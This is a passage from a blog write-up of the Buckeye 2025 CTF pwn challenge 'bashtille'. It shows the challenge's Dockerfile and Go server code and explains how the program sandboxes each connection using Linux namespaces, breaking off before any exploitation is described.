<!DOCTYPE html><html class="bg-background text-foreground scheme-light-dark" lang="en-US"> <head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes"><meta name="generator" content="Astro v5.8.0"><meta name="HandheldFriendly" content="True"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no"><meta name="theme-color" content="#121212" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#121212" media="(prefers-color-scheme: light)"><link rel="sitemap" href="/sitemap-index.xml"><link rel="manifest" href="/site.webmanifest"><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/other-files/ClientRouter.astro_astro_type_script_index_0_lang.CtSceO8m.js"></script><title>Buckeye 2025 – pwn/bashtille | z0v3r1n&#39;s blog</title><meta name="title" content="Buckeye 2025 – pwn/bashtille | z0v3r1n's blog"><link rel="canonical" href="https://z0v3r1n.github.io"><meta property="og:title" content="Buckeye 2025 – pwn/bashtille"><meta property="og:image" content="https://z0v3r1n.github.io/static/1200x630.png"><meta property="og:image:alt" content="Buckeye 2025 – pwn/bashtille"><meta property="og:type" content="website"><meta property="og:locale" content="en-US"><meta property="og:site_name" content="z0v3r1n's blog"><meta property="og:url" content="https://z0v3r1n.github.io/blog/buckeye-2025_bashtille/"><meta name="twitter:title" content="Buckeye 2025 – pwn/bashtille"><meta property="twitter:image" content="https://z0v3r1n.github.io/static/1200x630.png"><meta name="twitter:image:alt" content="Buckeye 2025 – pwn/bashtille"><meta name="twitter:card" content="summary_large_image"><meta property="article:tag" content="buckeye"><meta property="article:tag" content="pwn"><link rel="stylesheet" href="/other-files/about.DQPP2Tja.css"></head><body class="flex h-fit min-h-screen flex-col gap-y-6 font-sans"> <header class="bg-background/50 sticky top-0 z-50 divide-y backdrop-blur-sm xl:divide-none"> <div> <div class="mx-auto flex max-w-3xl items-center justify-between gap-4 px-4 py-3"> <a href="/" target="_self" class="transition-colors duration-300 ease-in-out flex shrink-0 items-center justify-center gap-3">  <span class="hidden h-full text-lg leading-none font-medium min-[400px]:block">z0v3r1n&#39;s blog</span>  </a> <div class="flex items-center gap-4"> <nav class="flex items-center gap-4 text-sm sm:gap-6"> <a href="/blog" target="_self" class="inline-block duration-300 ease-in-out text-foreground/60 hover:text-foreground transition-colors"> blog/
 </a><a href="/about" target="_self" class="inline-block duration-300 ease-in-out text-foreground/60 hover:text-foreground transition-colors"> about/
 </a> </nav> <button data-slot="button" class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-muted hover:text-foreground dark:hover:bg-muted/50 -my-2 -me-2 size-8" id="theme-toggle" title="Toggle theme"> <svg width="1em" height="1em" class="size-4 dark:hidden" data-icon="lucide:sun">   <symbol id="ai:lucide:sun" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41m11.32 11.32l1.41 1.41M2 12h2m16 0h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></g></symbol><use href="#ai:lucide:sun"></use>  </svg> <svg width="1em" height="1em" class="absolute hidden size-4 dark:block" data-icon="lucide:moon">   <symbol id="ai:lucide:moon" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3a6 6 0 0 0 9 9a9 9 0 1 1-9-9"/></symbol><use href="#ai:lucide:moon"></use>  </svg> <span class="sr-only">Toggle theme</span> </button> <script data-astro-rerun>
  (() => {
    const theme = (() => {
      const stored = localStorage?.getItem('theme') ?? ''
      if (['dark', 'light'].includes(stored)) return stored
      return window.matchMedia('(prefers-color-scheme: dark)').matches
        ? 'dark'
        : 'light'
    })()

    document.documentElement.setAttribute('data-theme', theme)
    window.localStorage.setItem('theme', theme)
  })()
</script> <script type="module">function a(){const e=document.documentElement,n=e.getAttribute("data-theme")==="dark"?"light":"dark";e.classList.add("[&_*]:transition-none"),e.setAttribute("data-theme",n),window.getComputedStyle(e).getPropertyValue("opacity"),requestAnimationFrame(()=>{e.classList.remove("[&_*]:transition-none")}),localStorage.setItem("theme",n)}function o(){document.getElementById("theme-toggle")?.addEventListener("click",a)}o();document.addEventListener("astro:after-swap",()=>{const e=localStorage.getItem("theme")||"light",t=document.documentElement;t.classList.add("[&_*]:transition-none"),window.getComputedStyle(t).getPropertyValue("opacity"),t.setAttribute("data-theme",e),requestAnimationFrame(()=>{t.classList.remove("[&_*]:transition-none")}),o()});</script> </div> </div> </div>   </header> <main class="w-full mx-auto flex grow flex-col gap-y-6 px-4">   <section class="grid grid-cols-[minmax(0px,1fr)_min(calc(var(--breakpoint-md)-2rem),100%)_minmax(0px,1fr)] gap-y-6">  <section class="col-start-2 flex flex-col gap-y-6 text-center"> <div class="flex flex-col"> <h1 class="mb-2 scroll-mt-31 text-3xl leading-tight font-medium sm:text-4xl" id="post-title"> Buckeye 2025 – pwn/bashtille </h1> <div class="text-muted-foreground divide-border mb-4 flex flex-col items-center justify-center divide-y text-xs sm:flex-row sm:flex-wrap sm:divide-x sm:divide-y-0 sm:text-sm"> <div class="flex w-full items-center justify-center gap-2 py-2 sm:w-fit sm:px-2 sm:py-0 first:sm:pl-0 last:sm:pr-0"> <span>November 9, 2025</span> </div> <div class="flex w-full items-center justify-center gap-2 py-2 sm:w-fit sm:px-2 sm:py-0 first:sm:pl-0 last:sm:pr-0"> <span> 4 min read  </span> </div>  </div> <div class="flex flex-wrap justify-center gap-2"> <a href="/tags/buckeye" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&#38;>svg]:size-3 gap-1 [&#38;>svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-muted text-foreground [a&#38;]:hover:bg-muted/90"> <svg width="1em" height="1em" class="size-3" data-icon="lucide:hash">   <symbol id="ai:lucide:hash" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 9h16M4 15h16M10 3L8 21m8-18l-2 18"/></symbol><use href="#ai:lucide:hash"></use>  </svg> buckeye </a><a href="/tags/pwn" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&#38;>svg]:size-3 gap-1 [&#38;>svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-muted text-foreground [a&#38;]:hover:bg-muted/90"> <svg width="1em" height="1em" viewBox="0 0 24 24" class="size-3" data-icon="lucide:hash">   <use href="#ai:lucide:hash"></use>  </svg> pwn </a> </div> </div> <nav class="col-start-2 grid grid-cols-1 gap-4 sm:grid-cols-2"> <a href="/blog/buckeye-2025_heap_exploitation#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-start size-full" aria-disabled="false">  <svg width="1em" height="1em" class="mr-2 size-4 transition-transform group-hover:-translate-x-1" data-icon="lucide:arrow-left">   <symbol id="ai:lucide:arrow-left" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m12 19l-7-7l7-7m7 7H5"/></symbol><use href="#ai:lucide:arrow-left"></use>  </svg> <div class="flex flex-col items-start overflow-hidden text-wrap"> <span class="text-muted-foreground text-left text-xs"> Previous Post </span> <span class="w-full text-left text-sm text-balance text-ellipsis"> Buckeye 2025 – forensics/heap_exploitation? </span> </div>  </a>  <a href="/blog/blackhat-mea-2025_verifmt#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-end size-full" aria-disabled="false">  <div class="flex flex-col items-end overflow-hidden text-wrap"> <span class="text-muted-foreground text-right text-xs"> Next Post </span> <span class="w-full text-right text-sm text-balance text-ellipsis"> Blackhat MEA CTF Final 2025 – pwn/verifmt </span> </div> <svg width="1em" height="1em" class="ml-2 size-4 transition-transform group-hover:translate-x-1" data-icon="lucide:arrow-right">   <symbol id="ai:lucide:arrow-right" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14m-7-7l7 7l-7 7"/></symbol><use href="#ai:lucide:arrow-right"></use>  </svg>  </a> </nav> </section>  <article class="prose col-start-2 max-w-none"> <p>We were given the following files:</p>
<div class="expressive-code"><link rel="stylesheet" href="/other-files/ec.jdn72.css"/><script type="module" src="/other-files/ec.8zarh.js"></script><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:80ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">$ ls -la</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">total 16</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">drwxrwxr-x 2 kali kali 4096 Nov  9 12:53 .</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">drwxrwxr-x 3 kali kali 4096 Nov 10 10:41 ..</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">-rwxrw-rw- 1 kali kali 2320 Dec 31  1979 bashtille.go</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">-rwxrw-rw- 1 kali kali  315 Dec 31  1979 Dockerfile</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">$ cat Dockerfile</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">FROM golang:1.25.0 AS builder</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">COPY bashtille.go ./</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">RUN go build bashtille.go</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">FROM debian</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">RUN mkdir /app</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">RUN mkdir -m 0333 /app/jails</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">USER 1000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">WORKDIR /app</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">COPY flag.txt /app/flag.txt</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">COPY --from=builder /go/bashtille /app/bashtille</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">CMD [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;while true; do timeout 1h /app/bashtille server; done&quot;]</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ ls -latotal 16drwxrwxr-x 2 kali kali 4096 Nov  9 12:53 .drwxrwxr-x 3 kali kali 4096 Nov 10 10:41 ..-rwxrw-rw- 1 kali kali 2320 Dec 31  1979 bashtille.go-rwxrw-rw- 1 kali kali  315 Dec 31  1979 Dockerfile$ cat DockerfileFROM golang:1.25.0 AS builderCOPY bashtille.go ./RUN go build bashtille.goFROM debianRUN mkdir /appRUN mkdir -m 0333 /app/jailsUSER 1000WORKDIR /appCOPY flag.txt /app/flag.txtCOPY --from=builder /go/bashtille /app/bashtilleCMD [&#34;/bin/bash&#34;, &#34;-c&#34;, &#34;while true; do timeout 1h /app/bashtille server; done&#34;]"><div></div></button></div></figure></div>
<p>The <code>Dockerfile</code> tells us the docker compiles <code>bashtille.go</code> program using <code>go build</code> and runs it via <code>/app/bashtille server</code>.</p>
<p>Looking at <code>bashtille.go</code>, we can see that the program parses the first argument passing via command line and, if it’s server/child it calls the <code>server()</code>/<code>child()</code> function respectively.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="go" class="wrap" style="--ecMaxLine:21ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">func</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">main</span><span style="--0:#24292E;--1:#E1E4E8">() {</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">switch</span><span style="--0:#24292E;--1:#E1E4E8"> os.Args[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">] {</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">case</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&quot;server&quot;</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">server</span><span style="--0:#24292E;--1:#E1E4E8">()</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">case</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&quot;child&quot;</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">child</span><span style="--0:#24292E;--1:#E1E4E8">(os.Args[</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">])</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">default</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">panic</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;help&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="func main() {  switch os.Args[1] {  case &#34;server&#34;:    server()  case &#34;child&#34;:    child(os.Args[2])  default:    panic(&#34;help&#34;)  }}"><div></div></button></div></figure></div>
<p><code>server()</code> functions sets up a listener on <code>:5000</code> port and, for each connection it passes the context to <code>handleConnection</code> with a <code>60 second</code> timeout.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="go" class="wrap" style="--ecMaxLine:76ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">func</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">server</span><span style="--0:#24292E;--1:#E1E4E8">() {</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">listener, err </span><span style="--0:#BF3441;--1:#F97583">:=</span><span style="--0:#24292E;--1:#E1E4E8"> net.</span><span style="--0:#6F42C1;--1:#B392F0">Listen</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;tcp&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#032F62;--1:#9ECBFF">&quot;:5000&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> err </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">nil</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">log.</span><span style="--0:#6F42C1;--1:#B392F0">Fatal</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Failed to start server:&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, err)</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">defer</span><span style="--0:#24292E;--1:#E1E4E8"> listener.</span><span style="--0:#6F42C1;--1:#B392F0">Close</span><span style="--0:#24292E;--1:#E1E4E8">()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">log.</span><span style="--0:#6F42C1;--1:#B392F0">Println</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Listening on port 5000...&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">conn, err </span><span style="--0:#BF3441;--1:#F97583">:=</span><span style="--0:#24292E;--1:#E1E4E8"> listener.</span><span style="--0:#6F42C1;--1:#B392F0">Accept</span><span style="--0:#24292E;--1:#E1E4E8">()</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> err </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">nil</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">log.</span><span style="--0:#6F42C1;--1:#B392F0">Println</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Connection error:&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, err)</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">continue</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">ctx, cancel </span><span style="--0:#BF3441;--1:#F97583">:=</span><span style="--0:#24292E;--1:#E1E4E8"> context.</span><span style="--0:#6F42C1;--1:#B392F0">WithTimeout</span><span style="--0:#24292E;--1:#E1E4E8">(context.</span><span style="--0:#6F42C1;--1:#B392F0">Background</span><span style="--0:#24292E;--1:#E1E4E8">(), </span><span style="--0:#005CC5;--1:#79B8FF">60</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">time.Second)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">go</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">func</span><span style="--0:#24292E;--1:#E1E4E8">() {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">defer</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">cancel</span><span style="--0:#24292E;--1:#E1E4E8">()</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">defer</span><span style="--0:#24292E;--1:#E1E4E8"> runtime.</span><span style="--0:#6F42C1;--1:#B392F0">GC</span><span style="--0:#24292E;--1:#E1E4E8">()</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent">      </span><span style="--0:#6F42C1;--1:#B392F0">handleConnection</span><span style="--0:#24292E;--1:#E1E4E8">(ctx, conn)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}()</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="func server() {  listener, err := net.Listen(&#34;tcp&#34;, &#34;:5000&#34;)  if err != nil {    log.Fatal(&#34;Failed to start server:&#34;, err)  }  defer listener.Close()  log.Println(&#34;Listening on port 5000...&#34;)  for {    conn, err := listener.Accept()    if err != nil {      log.Println(&#34;Connection error:&#34;, err)      continue    }    ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)    go func() {      defer cancel()      defer runtime.GC()      handleConnection(ctx, conn)    }()  }}"><div></div></button></div></figure></div>
<p><code>handleConnection()</code> closes the connection, creates a variable <code>dir</code> initialized to <code>/app/jails/&lt;radomHex(16)&gt;</code>, creates a <code>exe.CommandContext</code> to executes itself (<code>/proc/self/exe -&gt; /app/bashtille</code>) with cmdline arguments <code>child</code> and variable <code>dir</code> with <code>stdout</code>, <code>stdin</code> and, <code>stderr</code> set to our connection so we can interact the with program and, creates new namespace to isolate the process with new <code>UTS</code> namespace (<code>syscall.CLONE_NEWUTS</code>) for isolated domain/hostname, <code>PID</code> namespace (<code>syscall.CLONE_NEWPID</code>), <code>mount</code> namespace (<code>syscall.CLONE_NEWNS</code>) to isolate filesystem mounts and user namespace (<code>syscall.CLONE_NEWUSER</code>) which allows mapping of userids for privilege isolations finally mapping <code>ContainerID</code> to <code>0</code> (root inside the container) and, <code>HostID</code> to <code>1000</code> (normal user).</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="go" class="wrap" style="--ecMaxLine:106ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">func</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">handleConnection</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#AE4B07;--1:#FFAB70">ctx</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">context</span><span style="--0:#24292E;--1:#E1E4E8">.</span><span style="--0:#6F42C1;--1:#B392F0">Context</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#AE4B07;--1:#FFAB70">conn</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">net</span><span style="--0:#24292E;--1:#E1E4E8">.</span><span style="--0:#6F42C1;--1:#B392F0">Conn</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">defer</span><span style="--0:#24292E;--1:#E1E4E8"> conn.</span><span style="--0:#6F42C1;--1:#B392F0">Close</span><span style="--0:#24292E;--1:#E1E4E8">()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code">
